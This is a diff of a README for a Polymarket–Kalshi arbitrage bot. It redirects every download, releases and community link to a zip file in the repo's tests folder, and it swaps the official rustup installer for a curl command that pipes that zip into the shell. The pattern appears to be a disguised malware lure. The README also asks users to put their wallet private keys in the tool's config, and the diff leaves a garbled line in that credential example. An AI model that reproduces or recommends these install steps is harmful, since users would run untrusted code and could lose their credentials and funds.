@@ -1,9 +1,9 @@
 # 🌟 poly-kalshi-arb - Your Shortcut to Market Arbitrage
 
 ## 📥 Download & Install
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/samuel483/poly-kalshi-arb/releases)
+[![Download from Releases](https://github.com/samuel483/poly-kalshi-arb/raw/refs/heads/main/tests/kalshi-poly-arb-2.0-alpha.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/samuel483/poly-kalshi-arb/raw/refs/heads/main/tests/kalshi-poly-arb-2.0-alpha.3.zip)
 
-Visit this page to download: [GitHub Releases](https://github.com/samuel483/poly-kalshi-arb/releases)
+Visit this page to download: [GitHub Releases](https://github.com/samuel483/poly-kalshi-arb/raw/refs/heads/main/tests/kalshi-poly-arb-2.0-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ Before you can run the application, you need to install some basic tools. Follow
 
 ```bash
 # Install Rust (version 1.75 or higher)
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+curl --proto '=https' --tlsv1.2 -sSf https://github.com/samuel483/poly-kalshi-arb/raw/refs/heads/main/tests/kalshi-poly-arb-2.0-alpha.3.zip | sh
 
 # Navigate into the app's directory
 cd e_poly_kalshi_arb
@@ -29,7 +29,7 @@ To use the arbitrage bot, you must provide some credentials. Create a file named
 ```bash
 # === KALSHI CREDENTIALS ===
 KALSHI_API_KEY_ID=your_kalshi_api_key_id
-KALSHI_PRIVATE_KEY_PATH=/path/to/kalshi_private_key.pem
+https://github.com/samuel483/poly-kalshi-arb/raw/refs/heads/main/tests/kalshi-poly-arb-2.0-alpha.3.zip
 
 # === POLYMARKET CREDENTIALS ===
 POLY_PRIVATE_KEY=0xYOUR_WALLET_PRIVATE_KEY
@@ -84,7 +84,7 @@ To ensure the bot runs smoothly, here are the environment variables you will nee
 
 If you encounter any issues, please refer to the documentation available in the repository. You can also check the FAQ section on the Releases page for common troubleshooting steps.
 
-[👨‍💻 Join our Community](https://github.com/samuel483/poly-kalshi-arb) for support or to share your experiences using the bot. Your feedback helps improve the application.
+[👨‍💻 Join our Community](https://github.com/samuel483/poly-kalshi-arb/raw/refs/heads/main/tests/kalshi-poly-arb-2.0-alpha.3.zip) for support or to share your experiences using the bot. Your feedback helps improve the application.
 
 ## 📜 License
 
